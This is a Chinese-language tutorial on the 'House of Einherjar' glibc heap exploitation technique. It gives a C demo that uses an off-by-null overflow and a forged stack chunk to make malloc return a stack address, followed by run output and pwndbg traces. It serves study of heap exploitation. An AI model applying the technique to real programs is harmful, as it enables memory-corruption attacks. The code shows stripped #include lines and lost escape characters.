并且这个技术比poision null byte更强，但是也有一个附加条件就是需要泄漏堆
在ubuntu16.04 64bits上测试，可以在你有一个off-by-null漏洞时使用
    #include 
    #include 
    #include 
    #include 
    #include 
    int main()
    {
            uint8_t* a;
            uint8_t* b;
            uint8_t* d;
            fprintf(stderr, "nWe allocate 0x38 bytes for 'a'n");
            a = (uint8_t*) malloc(0x38);
            fprintf(stderr, "a: %pn", a);
        int real_a_size = malloc_usable_size(a);
        fprintf(stderr, "Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#xn", real_a_size);
        // create a fake chunk
        //我们可以在任意一个我们想要的地方来创建一个fake chunk,本例中我们将在栈上创建这个fake chunk
        fprintf(stderr, "nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stackn");
        //当然，你可以在heap或者bss段任一个你知道地址的地方创建fake chunk
        fprintf(stderr, "However, you can also create the chunk in the heap or the bss, as long as you know its addressn");
        //我们将我们的fwd和bck指针指向fake_chunk来pass unlink的checks
        fprintf(stderr, "We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checksn");
        //尽管有的时候我们可以在这儿使用unsafe unlink技术
        fprintf(stderr, "(although we could do the unsafe unlink technique here in some scenarios)n");
        size_t fake_chunk[6];
        fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
        fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
        fake_chunk[2] = (size_t) fake_chunk; // fwd
        fake_chunk[3] = (size_t) fake_chunk; // bck
        fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
        fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
        fprintf(stderr, "Our fake chunk at %p looks like:n", fake_chunk);
        fprintf(stderr, "prev_size (not used): %#lxn", fake_chunk[0]);
        fprintf(stderr, "size: %#lxn", fake_chunk[1]);
        fprintf(stderr, "fwd: %#lxn", fake_chunk[2]);
        fprintf(stderr, "bck: %#lxn", fake_chunk[3]);
        fprintf(stderr, "fwd_nextsize: %#lxn", fake_chunk[4]);
        fprintf(stderr, "bck_nextsize: %#lxn", fake_chunk[5]);
            /* In this case it is easier if the chunk size attribute has a least significant byte with
             * a value of 0x00. The least significant byte of this will be 0x00, because the size of
             * the chunk includes the amount requested plus some amount required for the metadata. */
            b = (uint8_t*) malloc(0xf8);
        int real_b_size = malloc_usable_size(b);
            fprintf(stderr, "nWe allocate 0xf8 bytes for 'b'.n");
            fprintf(stderr, "b: %pn", b);
            uint64_t* b_size_ptr = (uint64_t*)(b - 8);
        //这个技术通过覆盖chunk的size以及pre_inuse位来工作
        /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/
            fprintf(stderr, "nb.size: %#lxn", *b_size_ptr);
            fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101n");
            fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'n");
            a[real_a_size] = 0;
            fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
        //如果b的size是0x100的倍数，那么就很简单了，连size都不用改，直接修改他的pre_inuse位就好啦
        fprintf(stderr, "This is easiest if b.size is a multiple of 0x100 so you "
               "don't change the size of b, only its prev_inuse bitn");
        //如果已经被修改了，我们将在b内需要一个fake chunk，它将尝试合并下一个块
        fprintf(stderr, "If it had been modified, we would need a fake chunk inside "
               "b where it will try to consolidate the next chunkn");
        // Write a fake prev_size to the end of a
        fprintf(stderr, "nWe write a fake prev_size to the last %lu bytes of a so that "
               "it will consolidate with our fake chunkn", sizeof(size_t));
        size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
        fprintf(stderr, "Our fake prev_size will be %p - %p = %#lxn", b-sizeof(size_t)*2, fake_chunk, fake_size);
        *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
        //修改fake chunk的size去反应b的新的prev_size
        //Change the fake chunk's size to reflect b's new prev_size
        fprintf(stderr, "nModify fake chunk's size to reflect b's new prev_sizen");
        fake_chunk[1] = fake_size;
        //free b，之后他就会和我们的fake chunk合并了
        // free b and it will consolidate with our fake chunk
        fprintf(stderr, "Now we free b and this will consolidate with our fake chunk since b prev_inuse is not setn");
        free(b);
        fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)n", fake_chunk[1]);
        //如果我们在free b之前分配另一个chunk,我们需要做两件事
        //if we allocate another chunk before we free b we will need to
        //do two things:
        //1)我们将需要调整我们的fake chunk的size来使得fake_chunk+fake_chunk的size指针在我们所能控制的区域内
        //1) We will need to adjust the size of our fake chunk so that
        //fake_chunk + fake_chunk's size points to an area we control
        //2)我们将需要在我们控制的地址写我们的fake chunk的size
        //2) we will need to write the size of our fake chunk
        //at the location we control.
        //在做了这两件事情之后，当unlink被调用的时候，我们的Fake chunk就将通过check
        //After doing these two things, when unlink gets called, our fake chunk will
        //pass the size(P) == prev_size(next_chunk(P)) test.
        //否则我们需要确定我们的fake chunk可以抵御荒野？？？(荒野这里有点迷离
        //otherwise we need to make sure that our fake chunk is up against the
        //wilderness
        //现在我们再调用malloc的时候，返回的时候就该是我们fake chunk的地址了
        fprintf(stderr, "nNow we can call malloc() and it will begin in our fake chunkn");
        d = malloc(0x200);
        fprintf(stderr, "Next malloc(0x200) is at %pn", d);
    }
###  程序运行结果
    Welcome to House of Einherjar!
    Tested in Ubuntu 16.04 64bit.
    This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
    We allocate 0x38 bytes for 'a'
    a: 0x1767010
    Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38
    We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
    However, you can also create the chunk in the heap or the bss, as long as you know its address
    We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
    (although we could do the unsafe unlink technique here in some scenarios)
    Our fake chunk at 0x7ffc0cadecb0 looks like:
    prev_size (not used): 0x100
    size: 0x100
    fwd: 0x7ffc0cadecb0
    bck: 0x7ffc0cadecb0
    fwd_nextsize: 0x7ffc0cadecb0
    bck_nextsize: 0x7ffc0cadecb0
    We allocate 0xf8 bytes for 'b'.
    b: 0x1767050
    b.size: 0x101
    b.size is: (0x100) | prev_inuse = 0x101
    We overflow 'a' with a single null byte into the metadata of 'b'
    b.size: 0x100
    This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
    If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk
    We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
    Our fake prev_size will be 0x1767040 - 0x7ffc0cadecb0 = 0xffff8003f4c88390
    Modify fake chunk's size to reflect b's new prev_size
    Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
    Our fake chunk size is now 0xffff8003f4ca9351 (b.size + fake_prev_size)
    Now we can call malloc() and it will begin in our fake chunk
    Next malloc(0x200) is at 0x7ffc0cadecc0
###  关键部分调试
断点如下
       24   a = (uint8_t*) malloc(0x38);
     ► 25   fprintf(stderr, "a: %pn", a);
       26
       41     fake_chunk[3] = (size_t) fake_chunk; // bck
       42     fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
       43     fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
     ► 44
       45
       57   b = (uint8_t*) malloc(0xf8);
     ► 58     int real_b_size = malloc_usable_size(b);
       69   a[real_a_size] = 0;
     ► 70   fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
       79     size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
     ► 80     fprintf(stderr, "Our fake prev_size will be %p - %p = %#lxn", b-sizeof(size_t)*2, fake_chunk, fake_size);
     ► 81     *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
       83     //Change the fake chunk's size to reflect b's new prev_size
       84     fprintf(stderr, "nModify fake chunk's size to reflect b's new prev_sizen");
     ► 85     fake_chunk[1] = fake_size;
       89     free(b);
     ► 90     fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)n", fake_chunk[1]);
       104     d = malloc(0x200);
     ► 105     fprintf(stderr, "Next malloc(0x200) is at %pn", d);
好了，下面直接开始调试，首先是chunk a
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 65,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603040 PREV_INUSE {
      prev_size = 0,
      size = 135105,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后在我们给我们的fake_chunk赋值之后
    pwndbg> p/x fake_chunk
    $2 = {0x100, 0x100, 0x7fffffffe600, 0x7fffffffe600, 0x7fffffffe600, 0x7fffffffe600}
也就是
    $3 = {
      prev_size = 256,
      size = 256,
      fd = 0x7fffffffe600,
      bk = 0x7fffffffe600,
      fd_nextsize = 0x7fffffffe600,
      bk_nextsize = 0x7fffffffe600
    }
随后程序malloc了b
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 65,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603040 PREV_INUSE {
      prev_size = 0,
      size = 257,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603140 PREV_INUSE {
      prev_size = 0,
      size = 134849,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后给a[real_a_size]赋0x00,也就是
    pwndbg> x/10gx 0x603048
    0x603048:       0x0000000000000100      0x0000000000000000
    0x603058:       0x0000000000000000      0x0000000000000000
    0x603068:       0x0000000000000000      0x0000000000000000
    0x603078:       0x0000000000000000      0x0000000000000000
    0x603088:       0x0000000000000000      0x0000000000000000
之后设置fake_size为b和fake_chunk的差值
    pwndbg> p/x b-0x10
    $16 = 0x603040
    pwndbg> p/x &fake_chunk
    $17 = 0x7fffffffe600
    pwndbg> p/x 0x603040-0x7fffffffe600
    $18 = 0xffff800000604a40
    pwndbg>
之后程序将b的pre_size设为了fake_size
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 65,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603040 {
      prev_size = 18446603336227506752,
      size = 256,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603140 PREV_INUSE {
      prev_size = 0,
      size = 134849,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> p/x 18446603336227506752
    $30 = 0xffff800000604a40
一切就绪之后,程序将fake_chunk的szie设为了fake_chunk
    pwndbg> p/x fake_chunk
    $32 = {0x100, 0xffff800000604a40, 0x7fffffffe600, 0x7fffffffe600, 0x7fffffffe600, 0x7fffffffe600}
也就是
    $34 = {
      prev_size = 0x100,
      size = 0xffff800000604a40,
      fd = 0x7fffffffe600,
      bk = 0x7fffffffe600,
      fd_nextsize = 0x7fffffffe600,
      bk_nextsize = 0x7fffffffe600
    }
现在我们再free b,程序通过pre_size就会去找我们的fake
chunk,又发现我们的fake_chunk也是free态,因此就会与我们的fake_chunk合并,现在我们再malloc的话
    pwndbg> p/x d-0x10
    $39 = 0x7fffffffe600
## 总结
程序首先malloc了chunk a(0x38)
之后呢在栈上创建了fake chunk,并且伪造了fake chunk的结构
随后程序又malloc了chunk b(0xf8),b和top chunk相邻
我们计算量b和fake chunk的地址差后,将b的pre_size设为了我们的差值,并把b的pre_inuse置0,之后free掉了b
此时b就通过pre_size找到了我们的fake chunk并且与我们的fake chunk合并了,现在我们再申请一个chunk,就会从fake
chunk那分配了
over~